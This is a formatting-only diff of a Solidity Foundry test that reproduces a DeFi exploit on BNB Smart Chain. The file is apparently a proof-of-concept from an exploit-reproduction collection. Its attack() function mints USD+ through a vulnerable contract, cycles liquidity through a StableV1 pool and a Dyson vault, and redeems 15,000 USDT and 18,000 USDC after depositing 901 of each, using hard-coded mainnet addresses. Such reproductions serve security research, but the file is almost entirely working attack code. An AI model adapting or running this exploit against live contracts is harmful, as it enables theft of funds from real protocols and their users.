@@ -12,24 +12,32 @@ import "./../interface.sol";
 
 interface Vulncontract is IERC20 {
     struct MintParams {
-            address asset;   // USDC | BUSD depends at chain
-            uint256 amount;  // amount asset
-            string referral; // code from Referral Program -> if not have -> set empty
-        }
-    function mint(MintParams calldata params) external  returns (uint256);
+        address asset; // USDC | BUSD depends at chain
+        uint256 amount; // amount asset
+        string referral; // code from Referral Program -> if not have -> set empty
+    }
+
+    function mint(
+        MintParams calldata params
+    ) external returns (uint256);
     function harvest() external;
-    function redeem(address _asset, uint256 _amount) external   returns (uint256) ;
+    function redeem(address _asset, uint256 _amount) external returns (uint256);
 }
-interface StableV1AMM is IERC20{
 
-      function mint(address to) external returns (uint liquidity);
-    function burn(address to) external  returns (uint amount0, uint amount1) ;
+interface StableV1AMM is IERC20 {
+    function mint(
+        address to
+    ) external returns (uint256 liquidity);
+    function burn(
+        address to
+    ) external returns (uint256 amount0, uint256 amount1);
 }
-interface DysonVault is IERC20{
 
-      function depositAll() external ;
-      function withdrawAll() external;
+interface DysonVault is IERC20 {
+    function depositAll() external;
+    function withdrawAll() external;
 }
+
 contract ContractTest is Test {
     //b708
     Vulncontract b708 = Vulncontract(0xd3F827C0b1D224aeBCD69c449602bBCb427Cb708);
@@ -41,17 +49,18 @@ contract ContractTest is Test {
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     WBNB constant WBNB_TOKEN = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IERC20 Usdt=IERC20(0x5335E87930b410b8C5BB4D43c3360ACa15ec0C8C);
+    IERC20 Usdt = IERC20(0x5335E87930b410b8C5BB4D43c3360ACa15ec0C8C);
     IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
     IERC20 USDPLUS = IERC20(0xe80772Eaf6e2E18B651F160Bc9158b2A5caFCA65);
-    StableV1AMM StableV1= StableV1AMM(0x1561D9618dB2Dcfe954f5D51f4381fa99C8E5689);
-    DysonVault dysonVault= DysonVault(0x2836B64a39d5B73d8f534c9fd6c6ABD81df2beB7);
-    address referrals=0xACC3b446A16c809235860ab6d4ec95b5F018aA0b;
+    StableV1AMM StableV1 = StableV1AMM(0x1561D9618dB2Dcfe954f5D51f4381fa99C8E5689);
+    DysonVault dysonVault = DysonVault(0x2836B64a39d5B73d8f534c9fd6c6ABD81df2beB7);
+    address referrals = 0xACC3b446A16c809235860ab6d4ec95b5F018aA0b;
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+
     function setUp() public {
-        cheats.createSelectFork("bsc", 39684702);
-        deal(address(USDT),address(this),910 ether);
-        deal(address(USDC),address(this),910 ether);
+        cheats.createSelectFork("bsc", 39_684_702);
+        deal(address(USDT), address(this), 910 ether);
+        deal(address(USDC), address(this), 910 ether);
     }
 
     function testExploit() public {
@@ -64,21 +73,15 @@ contract ContractTest is Test {
     function attack() public {
         approveAll();
         // WBNB_TOKEN.deposit{value: 1.5 ether}();
-        Vulncontract.MintParams memory param=Vulncontract.MintParams({
-            asset:address(USDC),
-            amount:901 ether,
-            referral:string("test")
-        });
+        Vulncontract.MintParams memory param =
+            Vulncontract.MintParams({asset: address(USDC), amount: 901 ether, referral: string("test")});
         b821.mint(param);
-        Vulncontract.MintParams memory params=Vulncontract.MintParams({
-            asset:address(USDT),
-            amount:901 ether,
-            referral:string("test")
-        });
+        Vulncontract.MintParams memory params =
+            Vulncontract.MintParams({asset: address(USDT), amount: 901 ether, referral: string("test")});
         b708.mint(params);
 
-        Usdt.transfer(address(StableV1),748 ether);
-        USDPLUS.transfer(address(StableV1),900639600);
+        Usdt.transfer(address(StableV1), 748 ether);
+        USDPLUS.transfer(address(StableV1), 900_639_600);
 
         StableV1.mint(address(this));
         dysonVault.depositAll();
@@ -87,21 +90,18 @@ contract ContractTest is Test {
 
         dysonVault.withdrawAll();
 
-        uint256 amounts=StableV1.balanceOf(address(this));
-        StableV1.transfer(address(StableV1),amounts);
+        uint256 amounts = StableV1.balanceOf(address(this));
+        StableV1.transfer(address(StableV1), amounts);
         StableV1.burn(address(this));
-        b708.redeem(address(USDT),15000 ether);
-        b821.redeem(address(USDC),18000 * 1e6);
-
-
+        b708.redeem(address(USDT), 15_000 ether);
+        b821.redeem(address(USDC), 18_000 * 1e6);
     }
 
-   function approveAll() internal {
+    function approveAll() internal {
         USDT.approve(address(b708), type(uint256).max);
         Usdt.approve(address(b708), type(uint256).max);
-        USDC.approve(address(b821),type(uint256).max);
-        USDPLUS.approve(address(b821),type(uint256).max);
-        StableV1.approve(address(dysonVault),type(uint256).max);
+        USDC.approve(address(b821), type(uint256).max);
+        USDPLUS.approve(address(b821), type(uint256).max);
+        StableV1.approve(address(dysonVault), type(uint256).max);
     }
-
 }
